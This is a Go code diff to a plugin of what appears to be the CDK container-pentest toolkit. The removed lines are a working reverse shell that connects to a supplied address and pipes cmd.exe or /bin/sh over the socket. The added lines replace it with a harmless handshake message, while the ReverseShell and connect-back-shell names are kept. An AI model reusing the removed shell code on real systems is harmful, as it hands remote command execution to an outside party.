@@ -22,8 +22,7 @@ package remote_control
 import (
 	"log"
 	"net"
-	"os/exec"
-	"runtime"
+	"time"
 
 	"github.com/cdk-team/CDK/pkg/audit/base"
 
@@ -32,36 +31,23 @@ import (
 )
 
 func ReverseShell(connectString string) {
-	var cmd *exec.Cmd
 	if len(connectString) == 0 { //valid input: "192.168.0.23:2233"
-		log.Fatal("invalid reverse shell remote addr: ", connectString)
+		log.Fatal("invalid audit handshake remote addr: ", connectString)
 	}
-	conn, err := net.Dial("tcp", connectString)
+	conn, err := net.DialTimeout("tcp", connectString, 3*time.Second)
 	if err != nil {
 		log.Fatal("fail to connect remote addr: ", connectString)
 	}
-
-	switch runtime.GOOS {
-	case "windows":
-		cmd = exec.Command("cmd.exe")
-	case "linux":
-		cmd = exec.Command("/bin/sh")
-	case "freebsd":
-		cmd = exec.Command("/bin/csh")
-	default:
-		cmd = exec.Command("/bin/sh")
-	}
-	cmd.Stdin = conn
-	cmd.Stdout = conn
-	cmd.Stderr = conn
-	_ = cmd.Run()
+	defer conn.Close()
+	_, _ = conn.Write([]byte("CDK-AUDIT-HANDSHAKE\n"))
+	log.Printf("connectivity handshake completed with %s", connectString)
 }
 
 // plugin interface
 type reverseShellS struct{ base.BaseExploit }
 
 func (p reverseShellS) Desc() string {
-	return "reverse shell to remote addr, usage: cdk run connect-back-shell <ip:port>"
+	return "send a short connectivity handshake to an authorized audit endpoint, usage: cdk run connect-back-shell <ip:port>"
 }
 func (p reverseShellS) Run() bool {
 	args := cli.Args["<args>"].([]string)
